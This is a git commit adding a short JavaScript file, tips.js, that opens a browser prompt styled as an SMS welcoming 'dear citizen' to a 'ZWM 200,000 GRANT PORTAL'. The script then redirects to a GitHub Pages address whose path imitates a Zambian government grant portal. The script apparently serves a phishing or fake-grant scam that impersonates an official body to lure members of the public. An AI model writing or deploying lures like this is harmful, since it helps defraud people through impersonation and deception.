bacf419c6369593a03f7e6eaafcb047904603f3c
offernoww <josiahnyeti16@gmail.com>
2025-02-18 21:52:36 +0100

    Create tips.js

---
+++ tips.js
@@ -0,0 +1,6 @@
+
+var password = 'ZWM 200,000 GRANT PORTAL'
+password=prompt('SMS :Welcome dear citizen,Click OK to start your grant application  ','ZWM 200,000 GRANT PORTAL');
+if (password != 'ZWM 200,000 GRANT PORTAL') {
+location.href='https://offernoww.github.io/mysa.grant.portal.zm';
+}
